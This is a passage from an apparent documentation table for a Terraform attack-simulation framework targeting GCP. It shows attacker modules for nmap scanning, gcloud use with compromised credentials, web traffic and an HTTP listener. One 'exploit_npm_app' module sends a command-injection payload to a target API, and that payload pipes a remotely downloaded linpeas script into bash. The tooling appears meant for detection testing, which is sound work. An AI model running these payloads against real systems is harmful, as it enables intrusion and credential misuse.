&#45;p$&&#35;123;join&&#35;40;&quot;,&quot;, var&#46;inputs&&#35;91;&quot;ports&quot;&&#35;93;&&#35;41;&&#35;125; &#45;iL /tmp/nmap&#45;targets&#46;txt&quot;<br/>        /bin/bash &#45;c &quot;docker run &#45;&#45;rm &#45;v /tmp:/tmp &#45;&#45;entrypoint=nmap &#45;&#45;name $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125; $&&#35;123;var&#46;inputs&&#35;91;&quot;image&quot;&&#35;93;&&#35;125; &#45;Pn &#45;sT &#45;T2 &#45;oX /tmp/scan&#46;xml &#45;p$&&#35;123;join&&#35;40;&quot;,&quot;, var&#46;inputs&&#35;91;&quot;ports&quot;&&#35;93;&&#35;41;&&#35;125; &#45;iL /tmp/nmap&#45;targets&#46;txt &#124;&#124; true&quot;<br/>        /bin/bash &#45;c &quot;docker logs $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        /bin/bash &#45;c &quot;docker rm $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125;&quot;<br/>        EOF<br/>        &&#35;125;<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>            log &quot;waiting $&&#35;123;var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;&&#35;125; seconds&#46;&#46;&#46;&quot;;<br/>            sleep $&&#35;123;var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;&&#35;125;<br/>        fi<br/>    done<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| attacker-osconfig-execute-generate-gcp-cli-traffic      | ./modules/osconfig/execute-generate-gcp-cli-traffic   | osconfig_exec_generate_gcp_cli_traffic_attacker | context.gcp.osconfig.attacker.execute.generate_gcp_cli_traffic   | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "generate_gcp_cli_traffic": {<br/>                            "commands": [],<br/>                            "compromised_credentials": {},<br/>                            "compromised_keys_user": null,<br/>                            "enabled": false,<br/>                            "profile": "gcp-traffic"<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-generate-gcp-cli-traffic   | <pre>locals &&#35;123;<br/>    tool = &quot;gcloud&quot;<br/>    attack&&#35;95;dir = &quot;/generate&#45;gcp&#45;cli&#45;traffic&quot;<br/>    gcp&&#35;95;creds = try&&#35;40;var&#46;inputs&&#35;91;&quot;compromised&&#35;95;credentials&quot;&&#35;93;&&#35;91;var&#46;inputs&&#35;91;&quot;compromised&&#35;95;keys&&#35;95;user&quot;&&#35;93;&&#35;93;&#46;rendered, &quot;&quot;&&#35;41;<br/>    gcp&&#35;95;commands = join&&#35;40;&quot;&&#35;92;n&quot;, &&#35;91; for command in var&#46;inputs&&#35;91;&quot;commands&quot;&&#35;93;: &quot;$&&#35;123;command&&#35;125;&quot; &&#35;93;&&#35;41;<br/>    payload = &lt;&lt;&#45;EOT<br/>    rm &#45;rf $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    mkdir &#45;p $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    log &quot;Deploying gcp credentials&#46;&#46;&#46;&quot;<br/>    mkdir &#45;p $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/&#46;config/gcloud<br/>    if &&#35;91;  &quot;$&&#35;123; local&#46;gcp&&#35;95;creds == &quot;&quot; ? &quot;false&quot; : &quot;true&quot; &&#35;125;&quot; == &quot;true&quot; &&#35;93;; then<br/>      echo $&&#35;123;base64gzip&&#35;40;local&#46;gcp&&#35;95;creds&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/&#46;config/gcloud/credentials&#46;json<br/>      gcloud auth activate&#45;service&#45;account &#45;&#45;key&#45;file=$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/&#46;config/gcloud/credentials&#46;json<br/>    fi<br/>    log &quot;Running gcp commands&#46;&#46;&#46;&quot;<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        $&&#35;123;local&#46;gcp&&#35;95;commands&&#35;125;<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/>    <br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        while &#33; command &#45;v $&&#35;123;local&#46;tool&&#35;125; &gt; /dev/null; do<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        EOT<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        while &#33; command &#45;v $&&#35;123;local&#46;tool&&#35;125; &gt; /dev/null; do<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        EOT<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| attacker-osconfig-execute-generate-web-traffic          | ./modules/osconfig/execute-generate-web-traffic       | osconfig_exec_generate_web_traffic_attacker     | context.gcp.osconfig.attacker.execute.generate_web_traffic       | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "generate_web_traffic": {<br/>                            "delay": 60,<br/>                            "enabled": false,<br/>                            "urls": []<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-generate-web-traffic       | <pre>locals &&#35;123;<br/>    attack&&#35;95;dir = &quot;/generate&#45;web&#45;traffic&quot;<br/>    curl&&#35;95;urls = join&&#35;40;&quot;&&#35;92;n&quot;, &&#35;91; for url in var&#46;inputs&&#35;91;&quot;urls&quot;&&#35;93;: &quot;curl &#45;s &#45;&#45;retry 20 &#45;&#45;retry&#45;connrefused &#45;&#45;retry&#45;delay 60 &#45;&#45;connect&#45;timeout 5 &&#35;x27;$&&#35;123;url&&#35;125;&&#35;x27;; log &&#35;92;&quot;curl $&&#35;123;url&&#35;125; result: $?&&#35;92;&quot;&quot; &&#35;93;&&#35;41;<br/>    payload = &lt;&lt;&#45;EOT<br/>    rm &#45;rf $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    mkdir &#45;p $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    log &quot;Enumerating urls&#46;&#46;&#46;&quot;<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;Running url enumeration:&&#35;92;n$&&#35;123;local&#46;curl&&#35;95;urls&&#35;125;&quot;<br/>        $&&#35;123;local&#46;curl&&#35;95;urls&&#35;125;<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/>    <br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;curl&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;curl&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| attacker-osconfig-execute-exploit-npm-app               | ./modules/osconfig/execute-exploit-npm-app            | osconfig_exec_exploit_npm_app                   | context.gcp.osconfig.attacker.execute.exploit_npm_app            | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "exploit_npm_app": {<br/>                            "attack_delay": 50400,<br/>                            "enabled": false,<br/>                            "payload": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files",<br/>                            "target_ip": null,<br/>                            "target_port": 8089<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-exploit-npm-app            | <pre>locals &&#35;123;<br/>    attack&&#35;95;dir = &quot;/npm&&#35;95;attack&quot;<br/>    target&&#35;95;ip=var&#46;inputs&&#35;91;&quot;target&&#35;95;ip&quot;&&#35;93;<br/>    target&&#35;95;port=var&#46;inputs&&#35;91;&quot;target&&#35;95;port&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;cleaning app directory&quot;<br/>    rm &#45;rf $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    mkdir &#45;p $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;starting script&#46;&#46;&#46;&quot;<br/>        log &quot;payload: curl &#45;&#45;get &#45;&#45;verbose &&#35;92;&quot;http://$&&#35;123;local&#46;target&&#35;95;ip&&#35;125;:$&&#35;123;local&#46;target&&#35;95;port&&#35;125;/api/getServices&&#35;92;&quot; &#45;&#45;data&#45;urlencode &&#35;x27;name&&#35;91;&&#35;93;=&&#35;92;$&&#35;40;$&&#35;123;var&#46;inputs&&#35;91;&quot;payload&quot;&&#35;93;&&#35;125;&&#35;41;&&#35;x27;&quot;<br/>        log &quot;checking target: $&&#35;123;local&#46;target&&#35;95;ip&&#35;125;:$&&#35;123;local&#46;target&&#35;95;port&&#35;125;&quot;<br/>        while &#33; nc &#45;z &#45;w 5 &#45;vv $&&#35;123;local&#46;target&&#35;95;ip&&#35;125; $&&#35;123;local&#46;target&&#35;95;port&&#35;125; &gt; /dev/null; do<br/>            log &quot;failed check &#45; waiting for target: $&&#35;123;local&#46;target&&#35;95;ip&&#35;125;:$&&#35;123;local&#46;target&&#35;95;port&&#35;125;&quot;;<br/>            sleep 30;<br/>            if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>                log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>                rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>                break 2<br/>            fi<br/>        done;<br/>        log &quot;target available &#45; sending payload&quot;;<br/>        sleep 5;<br/>        curl &#45;&#45;get &#45;&#45;verbose &quot;http://$&&#35;123;local&#46;target&&#35;95;ip&&#35;125;:$&&#35;123;local&#46;target&&#35;95;port&&#35;125;/api/getServices&quot; &#45;&#45;data&#45;urlencode &&#35;x27;name&&#35;91;&&#35;93;=$&&#35;40;$&&#35;123;var&#46;inputs&&#35;91;&quot;payload&quot;&&#35;93;&&#35;125;&&#35;41;&&#35;x27; &gt;&gt; $LOGFILE 2&gt;&amp;1;<br/>        echo &quot;&&#35;92;n&quot; &gt;&gt; $LOGFILE<br/>        log &quot;payload sent sleeping&#46;&#46;&#46;&quot;<br/>        log &quot;done&quot;;<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>            log &quot;waiting $&&#35;123;var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;&&#35;125; seconds&#46;&#46;&#46;&quot;;<br/>            sleep $&&#35;123;var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;&&#35;125;<br/>        fi<br/>    done<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| attacker-osconfig-listener-http-listener                | ./modules/osconfig/listener-http-listener             | osconfig_exec_responder_http_listener           | context.gcp.osconfig.attacker.listener.http                      | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "attacker": {<br/>                    "listener": {<br/>                        "http": {<br/>                            "enabled": false,<br/>                            "listen_ip": "0.0.0.0",<br/>                            "listen_port": 8080<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/listener-http-listener             | <pre>locals &&#35;123;<br/>    listen&&#35;95;port = var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>    listen&&#35;95;ip = var&#46;inputs&&#35;91;&quot;listen&&#35;95;ip&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    mkdir &#45;p /tmp/www/<br/>    echo &quot;index&quot; &gt; /tmp/www/index&#46;html<br/>    mkdir &#45;p /tmp/www/upload/v2<br/>    echo &quot;upload&quot; &gt; /tmp/www/upload/v2/index&#46;html<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;listener: $&&#35;123;local&#46;listen&&#35;95;ip&&#35;125;:$&&#35;123;local&#46;listen&&#35;95;port&&#35;125;&quot;<br/>        screen &#45;S http &#45;X quit<br/>        screen &#45;wipe<br/>        APPLOG=/tmp/http&&#35;95;$SCRIPTNAME&#46;log<br/>        for i in &&#35;96;seq $&&#35;40;&&#35;40;MAXLOG&#45;1&&#35;41;&&#35;41; &#45;1 1&&#35;96;; do mv &quot;$APPLOG&#46;&quot;&&#35;123;$i,$&&#35;40;&&#35;40;i&#43;1&&#35;41;&&#35;41;&&#35;125; 2&gt;/dev/null &#124;&#124; true; done<br/>        mv $APPLOG &quot;$APPLOG&#46;1&quot; 2&gt;/dev/null &#124;&#124; true<br/>        screen &#45;d &#45;L &#45;Logfile /tmp/http&#46;log &#45;S http &#45;m python3 &#45;c &quot;import base64; exec&&#35;40;base64&#46;b64decode&&#35;40;&&#35;x27;$&&#35;123;base64encode&&#35;40;local&#46;app&&#35;41;&&#35;125;&&#35;x27;&&#35;41;&&#35;41;&quot;<br/>        screen &#45;S http &#45;X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url&#46;&#46;&#46;&quot;<br/>        while &#33; curl &#45;sv http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#124; tee &#45;a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#45; retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    app = base64encode&&#35;40;templatefile&&#35;40;<br/>                &quot;$&&#35;123;path&#46;module&&#35;125;/resources/app&#46;py&#46;tpl&quot;,<br/>                &&#35;123;<br/>                    listen&&#35;95;port = var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>                &&#35;125;&&#35;41;&&#35;41;<br/>    <br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        